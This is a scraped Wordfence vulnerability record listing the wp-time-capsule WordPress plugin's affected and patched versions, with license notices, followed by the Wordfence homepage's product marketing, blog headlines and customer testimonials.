| Software Slug | wp-time-capsule [(view on wordpress.org)](https://wordpress.org/plugins/wp-time-capsule) |
| Patched? | Yes |
| Remediation | Update to version 1.22.22, or a newer patched version |
| Affected Version | * <= 1.22.21 |
| Patched Version | * 1.22.22 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from www.wordfence.com_3eafe61f_20250115_193656.html ===


![Wordfence®](/img/hero-wordfence-text.png)

# The global leader in WordPress security.

[Learn more >](/products/pricing/)

## Discover which plan is right for you.

Join over 5 million secure WordPress site owners using Wordfence Free. Block
attacks with the basic tools you need to keep your site safe. The Free version has a 30-day delay on firewall rules and malware signatures.

[Learn More](/products/wordfence-free/)

Real-time updates to firewall rules and malware signatures as new threats emerge, continuously updated Premium IP Blocklist blocks over 40,000 known threat actors, Country Blocking, access to the security Audit Log, Premium Support, and more.

[Learn More](/products/wordfence-premium/)

Wordfence Care includes the benefits of Premium with unlimited hands-on
incident response and hands-on support. For business owners who value their time: If you have an
incident, our world-class analysts take care of it.

[Learn More](/products/wordfence-care/)

For Mission Critical websites, Wordfence Response provides incident response 24
hours a day, 7 days a week and 365 days a year with a 1-hour response time and 24 hours time to
resolution. If down-time has a financial impact, choose Wordfence Response.

[Learn More](/products/wordfence-response/)

[Compare plans >](/products/pricing/)

## Wordfence is the global leader in WordPress security.

The average WordPress site is attacked once every
**34** minutes.
**43** requests hit that site every day
probing for weak and breached passwords, vulnerable plugins and themes, and other points of entry.
Websites protected by Wordfence are shielded from those attacks with an average of
**215M** hits being blocked across
our network every day.

[Secure your site today >](/products/pricing/)

64K
malicious IPs blocklisted in the past 30 days

6.5B
attacks blocked in the past 30 days

555
web application firewall rules

5,239
malware signatures in our real-time malware signature set

## Manage all of your sites in one place with Wordfence Central [Learn more >](/products/wordfence-central/)

**Save Time And Streamline Your Security With Wordfence Central.** Wordfence Central is **free for all Wordfence users**, including our Wordfence Free customers, without any catch or upsell. Get an **instantaneous view** of the security posture of all your WordPress websites, configure Wordfence across a few or **thousands of sites** using templates, **launch scans**, manage licenses, and **view security events** all from a Central Dashboard. Paid Wordfence sites additionally include access to the security Audit Log to track events for each site. Wordfence Central is a must-have for agency owners or anyone else who manages security for multiple websites.

![Wordfence Central Preview](/img/wordfence-central-preview.png)

Introducing

[![Wordfence® CLI](/img/hero-wordfence-cli-logo.png)](/products/wordfence-cli/)

[Learn more >](/products/wordfence-cli/)

A high performance security scanner for a second line of detection

*Secure your system at the server level with our malware and vulnerability scanner*

[![Wordfence® Intelligence](/img/hero-wordfence-intelligence-logo.png)](/threat-intel/)

[Learn more >](/threat-intel/)

WordPress vulnerability information at your fingertips

*Access the same Threat Intelligence Data used to power our popular Wordfence security plugin*

## Breaking news from our blog

[View all >](/blog)

[![](https://www.wordfence.com/wp-content/uploads/2025/01/WFI-Vuln-Report-WeekofsDec16.png)](https://www.wordfence.com/blog/2025/01/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-16-2024-to-january-5-2025/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (December 16, 2024 to January 5, 2025)](https://www.wordfence.com/blog/2025/01/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-16-2024-to-january-5-2025/)

📢 Did you know Wordfence runs a Bug Bounty Program for all WordPress plugin and themes at no cost to vendors?

[![](https://www.wordfence.com/wp-content/uploads/2024/12/WFI-Vuln-Report-WeekofsDec9.png)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-9-2024-to-december-15-2024/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (December 9, 2024 to December 15, 2024)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-9-2024-to-december-15-2024/)

💥 Time to wrap up this year and kick-off the new year with a bang!

[![](https://www.wordfence.com/wp-content/uploads/2024/12/WFI-Vuln-Report-WeekofsDec2.png)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-2-2024-to-december-8-2024/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (December 2, 2024 to December 8, 2024)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-december-2-2024-to-december-8-2024/)

💥 Time to wrap up this year and kick-off the new year with a bang!

[![](https://www.wordfence.com/wp-content/uploads/2024/12/FeaturedImage_Wordfence_161.02.png)](https://www.wordfence.com/blog/2024/12/6000000-wordpress-sites-protected-against-payment-refund-and-subscription-cancellation-vulnerability-in-wpforms-wordpress-plugin/)
### [6,000,000 WordPress Sites Protected Against Payment Refund and Subscription Cancellation Vulnerability in WPForms WordPress Plugin](https://www.wordfence.com/blog/2024/12/6000000-wordpress-sites-protected-against-payment-refund-and-subscription-cancellation-vulnerability-in-wpforms-wordpress-plugin/)

On October 23th, 2024, we received a submission for a Missing Authorization to Payment Refund and Subscription Cancellation vulnerability in WPForms, a WordPress plugin with more than 6,000,000 active installations.

[![](https://www.wordfence.com/wp-content/uploads/2024/12/WFI-Vuln-Report-WeekofsNov25.png)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-25-2024-to-december-1-2024/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (November 25, 2024 to December 1, 2024)](https://www.wordfence.com/blog/2024/12/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-25-2024-to-december-1-2024/)

💥 Time to wrap up this year and kick-off the new year with a bang!

[![](https://www.wordfence.com/wp-content/uploads/2024/11/WFI-Vuln-Report-WeekofsNov18.png)](https://www.wordfence.com/blog/2024/11/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-18-2024-to-november-24-2024/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (November 18, 2024 to November 24, 2024)](https://www.wordfence.com/blog/2024/11/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-18-2024-to-november-24-2024/)

🦸 💥 Calling all superheroes and hunters! Introducing the End of Year Holiday Extravaganza and the WordPress Superhero Challenge for the Wordfence Bug Bounty Program!

[![](https://www.wordfence.com/wp-content/uploads/2024/11/FeaturedImage_Wordfence_160.03.02.png)](https://www.wordfence.com/blog/2024/11/200000-wordpress-sites-affected-by-unauthenticated-critical-vulnerabilities-in-anti-spam-by-cleantalk-wordpress-plugin/)
### [200,000 WordPress Sites Affected by Unauthenticated Critical Vulnerabilities in Anti-Spam by CleanTalk WordPress Plugin](https://www.wordfence.com/blog/2024/11/200000-wordpress-sites-affected-by-unauthenticated-critical-vulnerabilities-in-anti-spam-by-cleantalk-wordpress-plugin/)

200,000 WordPress Sites Affected by Unauthenticated Critical Vulnerabilities in Anti-Spam by CleanTalk WordPress Plugin

[![](https://www.wordfence.com/wp-content/uploads/2024/11/WFI-Vuln-Report-WeekofsNov11.png)](https://www.wordfence.com/blog/2024/11/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-11-2024-to-november-17-2024/)
### [Wordfence Intelligence Weekly WordPress Vulnerability Report (November 11, 2024 to November 17, 2024)](https://www.wordfence.com/blog/2024/11/wordfence-intelligence-weekly-wordpress-vulnerability-report-november-11-2024-to-november-17-2024/)

🦸 💥 Calling all superheroes and hunters! Introducing the End of Year Holiday Extravaganza and the WordPress Superhero Challenge for the Wordfence Bug Bounty Program!

## Join the official Wordfence mailing list

Receive WordPress security alerts, news, and research in your inbox before it appears in the press.

## Wordfence in the press

[View all >](/news/)

[![Search Engine Journal](https://www.wordfence.com/wp-content/uploads/2020/04/SEJ-logo.png)](https://www.searchenginejournal.com/wordpress-contact-form-vulnerabilities/526057/)
### [Vulnerabilities In Two WordPress Contact Form Plugins Affect +1.1 Million](https://www.searchenginejournal.com/wordpress-contact-form-vulnerabilities/526057/)

[![WP Tavern](https://www.wordfence.com/wp-content/uploads/2021/03/wp_tavern-media.png)](https://wptavern.com/remote-code-execution-vulnerability-patched-in-wpml-wordpress-plugin)
### [Remote Code Execution Vulnerability Patched in WPML WordPress Plugin](https://wptavern.com/remote-code-execution-vulnerability-patched-in-wpml-wordpress-plugin)

[![WP Tavern](https://www.wordfence.com/wp-content/uploads/2021/03/wp_tavern-media.png)](https://wptavern.com/wordfence-launches-wordpress-superhero-challenge-with-big-rewards)
### [Wordfence Launches WordPress Superhero Challenge with Big Rewards](https://wptavern.com/wordfence-launches-wordpress-superhero-challenge-with-big-rewards)

[![TechRadar](https://www.wordfence.com/wp-content/uploads/2020/11/techradar.png)](https://www.techradar.com/pro/security/thousands-of-wordpress-sites-potentially-at-risk-from-plugin-security-flaw)
### [Thousands Of WordPress Sites Potentially At Risk From Plugin Security Flaw](https://www.techradar.com/pro/security/thousands-of-wordpress-sites-potentially-at-risk-from-plugin-security-flaw)

[![SecurityWeek Logo](https://www.wordfence.com/wp-content/uploads/2022/02/securityweek_logo.png)](https://www.securityweek.com/critical-flaw-in-donation-plugin-exposed-100000-wordpress-sites-to-takeover/)
### [Critical Flaw in Donation Plugin Exposed 100,000 WordPress Sites to Takeover](https://www.securityweek.com/critical-flaw-in-donation-plugin-exposed-100000-wordpress-sites-to-takeover/)

[![](https://www.wordfence.com/wp-content/uploads/2023/08/THN.png)](https://thehackernews.com/2024/08/givewp-wordpress-plugin-vulnerability.html)
### [GiveWP WordPress Plugin Vulnerability Puts 100,000+ Websites at Risk](https://thehackernews.com/2024/08/givewp-wordpress-plugin-vulnerability.html)

[![WP Tavern](https://www.wordfence.com/wp-content/uploads/2021/03/wp_tavern-media.png)](https://wptavern.com/critical-vulnerability-patched-in-givewp-plugin)
### [Critical Vulnerability Patched in GiveWP Plugin](https://wptavern.com/critical-vulnerability-patched-in-givewp-plugin)

[![WP Tavern](https://www.wordfence.com/wp-content/uploads/2021/03/wp_tavern-media.png)](https://wptavern.com/wordfence-cli-2-0-1-update-adds-free-vulnerability-scanning)
### [Wordfence CLI 2.0.1 Update Adds Free Vulnerability Scanning](https://wptavern.com/wordfence-cli-2-0-1-update-adds-free-vulnerability-scanning)

## Why choose Wordfence?

370M
total downloads

5M
sites with Wordfence

24/7
support, all year round

3,985
5-star reviews

[Get started today >](/products/pricing/)

- ### Awesome Plugin and Premium Support

  Wordfence Premium has provided excellent customer service. The plugin is easy to use, and the premium support is friendly and informative. Very happy with their service.

  docmolly

  @docmolly
- ### Fantastic Support – The Best Solution for a Hacked Website

  If you know the horror of having your website hacked, you know the mountain of stress that comes with it. Even worse is trying to find a solution to fix your hacked website for a reasonable price without being overly sold to. This is where WordFence comes in to save the day.

  They very quickly and thoroughly fixed my hacked website, keeping me updated with the status at all times. I also received a long report detailing what was hacked, how it was fixed, and instructions to secure my website from future hacks. In a matter of days, my site was unblacklisted by Google and I’m back in business!

  While I can’t yet speak to how well WordFence secures your website from hacks, I can say that they have been the best solution for fixing my hacked website. Based on that experience, I have no problem entrusting them with securing my website going forward.

  THANK YOU WORDFENCE! It was worth every penny.

  suzippy

  @suzippy
- ### Wordfence site-cleaning team saved my client big time

  I’ve have the Wordfence plugin (free version) on dozens of my personal and client sites for a few years. Easy to install and configure, it’s blocked many attacks and I’ve never had a site hacked that had it. On one client site, we didn’t use it, they got hacked and it was nasty, they sell tickets to their events and their payment system stopped taking payments (and gave some customers virus/malware).

  Not just one site, but the client’s entire hosting account was infected. I contacted Wordfence for a site cleaning and they got on it right away. In two days, the site was cleaned and taking payments again. Wordfence running on the sites after the cleaning reported a malware backdoor in my wptwin site-cloning script. I sent the report and the wptwin.php script to the security analyst who cleaned the site and within a few hours, he replied that indeed this was a false positive. That was great service and set me at ease that the client’s site had not become re-infected.

  imagiNed

  @imagined
- ### Excellent support and the best security plugin

  We have been using Wordfence (free version) for years on all our 100+ WordPress websites. We haven’t had any hacked websites since then. Just recently we purchased the premium license to increase the security of our websites even more. We had some questions regarding a multi WP install on the same domain in various subfolders and received timely and professional support within a day. Everything is setup properly now and we sleep quietly at night knowing that it’s all secured.

  ByteMotion

  @bytemotion
- ### Wordfence is the best!

  I’ve been using Wordfence for some time now on 6 of my sites. It works extremely well and provides me with the protection from intruders that I need. I’ve only had a couple of minor issues, mostly caused by my lack of experience, but the support at Wordfence has been great at helping me out of a jam. I highly recommend the plugin, and purchasing the upgrade to the pro version is worth every penny. The plugin is easy to install and setup is simple. And.. if your host is GoDaddy, it is one of their recommended plugin partners.

  lairbear

  @lairbear
- ### Awesome

  Wordfence is my favourite WordPress plugin. Immediately installed on all my client’s sites. Saved my bacon numerous times.

  bluesix

  @bluesix
- ### Wordfence review

  Wordfence is a top-notch plugin, even the free version has tons on functions. I strongly recommend it for not only the newbie web-designer but also the experienced one as well. It is undoubtedly a great product.

  Steve F.

  sfekete111
- ### Thank you very much for providing such a good plugin and service

  Having researched and trialed various security plugins Wordfence wins hands down each time. All our websites are running Wordfence Premium and this plugin has served us very well for several years and the support team are second to none. As a small business there are an array of tasks to take care of and it is a very small price to pay for Wordfence Premium to take care of an extremely important task and is worth every penny.

  A reliable security plugin is paramount but it goes without saying this must be backed up by a good technical support team who can assist you when there is a problem. The Wordfence technical support goes beyond the call of duty and their knowledge is very reassuring when things go awry with your website.

  Phil provided an excellent service giving us the confidence we are with the right people who really know what they are doing and can explain and assist in a very succinct, knowledgeable and helpful manner.

  Having numerous plugins running on a WordPress website can result in all manner of conflicts, never mind issues that maybe caused by the hosting services used which can be a nightmare to unravel without the right technical support at hand.

  Wordfence not only protects your website from being hacked but provides a wealth of advice and excellent technical support when needed. Thank you very much for providing such a good service.

  aristocats

  aristocats
- ### Best Money I Spend!

  Wordfence is by far the best and most important plug-in I have installed on every site I maintain. The free version is good, but the premium version is worth every penny and more. In fact, I refuse to create or maintain a site without it.

  daisy2love

  daisy2love
- ### Amazing, Must-have for WP Site security

  My small business WP Site got hacked (built, installed and maintained by me) and a cryptocurrency miner was hidden somewhere in my code.

  I spent a week trying to eliminate that code, and my Host also looked for it, without success, meanwhile I looked like a jerk trying to mine cryptocurrency from clients and potential clients!

  I tried several other WP security plugins, and web scan sites, but none could find or fix my problem.

  I downloaded and installed Wordfence, it found and repaired my problem in less than 5 minutes!

  I’ve since enabled many of its additional features and have been stunned to learn just how many attempts there are daily to log into my page! No wonder it got hacked. Some jerk even set up a new username for himself!

  Anyhow, I’ll never have any other WP page without Wordfence, and neither should you!

  Amazing plugin, very simple and very powerful.

  Cain57

  @cain57

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


